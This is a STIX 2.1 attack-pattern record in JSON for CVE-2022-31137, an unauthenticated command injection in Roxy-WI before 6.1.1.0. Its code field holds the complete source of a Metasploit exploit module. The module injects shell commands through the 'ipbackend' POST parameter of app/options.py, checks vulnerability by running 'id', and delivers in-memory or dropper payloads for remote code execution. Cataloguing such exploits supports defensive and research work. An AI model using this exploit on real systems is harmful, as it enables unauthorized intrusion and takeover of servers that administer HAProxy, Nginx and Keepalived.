{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a3de87f-b074-48ff-9db5-94fdfce07e59",
    "created": "2024-08-14T17:01:48.460787Z",
    "modified": "2024-08-14T17:01:48.460791Z",
    "name": "Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE",
    "description": " This module exploits an unauthenticated command injection vulnerability in Roxy-WI prior to version 6.1.1.0. Successful exploitation results in remote code execution under the context of the web server user.  Roxy-WI is an interface for managing HAProxy, Nginx and Keepalived servers.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/roxy_wi_exec.rb",
            "external_id": "roxy_wi_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-31137"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection vulnerability in Roxy-WI\n          prior to version 6.1.1.0. Successful exploitation results in remote code execution\n          under the context of the web server user.\n\n          Roxy-WI is an interface for managing HAProxy, Nginx and Keepalived servers.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Nuri \u00c7ilengir <nuri[at]prodaft.com>', # Author & Metasploit module\n        ],\n        'References' => [\n          ['URL', 'https://pentest.blog/advisory-roxywi-unauthenticated-remote-code-execution-cve-2022-3113/'], # Advisory\n          ['URL', 'https://github.com/hap-wi/roxy-wi/security/advisories/GHSA-53r2-mq99-f532'], # Additional Information\n          ['URL', 'https://github.com/hap-wi/roxy-wi/commit/82666df1e60c45dd6aa533b01a392f015d32f755'], # Patch\n          ['CVE', '2022-31137']\n        ],\n        'DefaultOptions' => {\n          'SSL' => true,\n          'WfsDelay' => 25\n        },\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :in_memory\n            }\n          ],\n          [\n            'Linux (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper\n            }\n          ]\n        ],\n        'CmdStagerFlavor' => ['printf'],\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2022-07-06',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])\n      ]\n    )\n  end\n\n  def execute_command(cmd, _opts = {})\n    return send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'app', 'options.py'),\n        'vars_post' => {\n          'serv' => '127.0.0.1',\n          'ipbackend' => \"\\\"; #{cmd} ;#\",\n          'alert_consumer' => Rex::Text.rand_text_alpha_lower(7),\n          'backend_server' => '127.0.0.1'\n        }\n      }, 10\n    )\n  rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Errno::ETIMEDOUT\n    return nil\n  end\n\n  def check\n    print_status(\"Checking if #{peer} is vulnerable!\")\n\n    res = execute_command('id')\n\n    return CheckCode::Unknown(\"Didn't receive a response from #{peer}\") unless res\n\n    if res.code == 200 && res.body =~ /uid=\\d+\\(.+\\)/\n      print_status(\"#{peer} is vulnerable!\")\n      return CheckCode::Vulnerable('The device responded to exploitation with a 200 OK and test command successfully executed.')\n    elsif res.code == 200\n      return CheckCode::Unknown('The target did respond 200 OK response however it did not contain the expected payload.')\n    else\n      return CheckCode::Safe(\"The #{peer} did not respond a 200 OK response and the expected response, meaning its not vulnerable.\")\n    end\n  end\n\n  def exploit\n    print_status('Exploiting...')\n    case target['Type']\n    when :in_memory\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-07-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}